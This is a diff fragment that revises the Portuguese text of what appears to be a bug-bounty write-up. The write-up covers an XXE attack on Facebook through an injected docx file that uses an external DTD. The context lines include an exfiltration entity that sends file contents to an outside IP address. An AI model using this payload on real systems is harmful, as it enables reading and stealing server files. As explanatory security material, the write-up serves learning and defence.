@@ -146,7 +146,7 @@ Ao perceber que poderia injetar um arquivo docx, o pesquisador extraiu o mesmo e
 %send;
 ]]>
 ```
-como podem perceber o valor ```%dtd``` faz referência a um arquivo dtd externo, e ao chamá-lo é verificado uma entity como esta:
+pode-se perceber duas coisas no código acima, a primeira é que o valor ```%dtd``` faz referência a um arquivo dtd externo, e a segunda é que podemos chamar variáveis das ```ENTITY'S``` dentro do ```DOCTYPE``` logo, ao chamá-las é executado uma request para a url de ```%dtd``` ela responde com uma entity igual a esta:
 
 ```xml
 <!ENTITY send SYSTEM 'http://197.37.102.90/?FACEBOOK-HACKED%26file;'>
